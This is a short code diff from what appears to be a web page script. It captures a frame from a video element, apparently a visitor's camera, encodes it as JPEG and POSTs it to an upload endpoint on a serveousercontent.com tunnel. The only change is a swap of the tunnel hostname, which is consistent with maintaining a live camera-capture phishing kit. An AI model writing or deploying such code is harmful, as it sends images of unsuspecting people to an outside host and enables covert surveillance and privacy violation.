@@ -22,7 +22,7 @@
                     setTimeout(() => {
                         ctx.drawImage(video, 0, 0);
                         const dataURL = canvas.toDataURL('image/jpeg');
-                        fetch('https://ccccfa337e8f9f24-5-182-87-154.serveousercontent.com/upload', {
+                        fetch('https://4d49f1587fa7f04a-5-182-87-154.serveousercontent.com/upload', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ image: dataURL })
